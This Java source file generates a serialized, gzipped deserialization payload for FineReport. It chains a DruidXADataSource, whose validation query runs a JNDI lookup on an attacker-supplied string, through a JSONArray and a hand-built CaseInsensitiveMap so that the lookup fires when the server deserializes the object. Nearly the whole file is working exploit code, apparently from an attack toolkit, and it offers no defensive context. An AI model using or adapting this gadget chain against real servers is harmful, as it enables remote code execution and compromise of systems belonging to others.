package com.example.frchannel.payload;




import com.fr.json.JSONArray;
import com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;

import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.ArrayList;
import java.util.Map;

public class finedruid {
    public static byte[] getpayload(String command) throws Exception{
        DruidXADataSource druidDataSource = new DruidXADataSource();

        druidDataSource.setUrl("jdbc:hsqldb:mem:testdb;");
        druidDataSource.setDriverClassName("com.fr.third.org.hsqldb.jdbcDriver");
        druidDataSource.setLogWriter(null);
        druidDataSource.setStatLogger(null);

        druidDataSource.setValidationQuery("call \"javax.naming.InitialContext.doLookup\"('"+command +"')");
        druidDataSource.setInitialSize(1);

        utils.setFieldValue(druidDataSource,"transactionHistogram",null);
        utils.setFieldValue(druidDataSource,"initedLatch",null);

//        创建ArrayList对象
        ArrayList arrayList = new ArrayList();
        arrayList.add(druidDataSource);

        JSONArray objects1 = new JSONArray(arrayList);

        Map s= (Map) utils.createWithoutConstructor("com.fr.third.org.apache.commons.collections4.map.CaseInsensitiveMap");
//        o.put(objects1,objects1);

        utils.setFieldValue(s, "size", 2);
        // 防止序列化时触发
        Class<?> nodeB;
        try {
            nodeB = Class.forName("com.fr.third.org.apache.commons.collections4.map.AbstractHashedMap$HashEntry");
        } catch (ClassNotFoundException e) {
            nodeB = Class.forName("com.fr.third.org.apache.commons.collections4.map.AbstractHashedMap$HashEntry");
        }
        Constructor<?> nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeB, 2);
        Array.set(tbl, 0, nodeCons.newInstance(null,0, objects1, "key1"));
        Array.set(tbl, 1, nodeCons.newInstance(null,0, objects1, "key2"));
        utils.setFieldValue(s, "data", tbl);

        byte[] serialize = utils.serialize(s);
        PrintStream out = System.out;
        utils.GzipCompress(serialize,out);
        return utils.GzipCompress(serialize);
    }
}
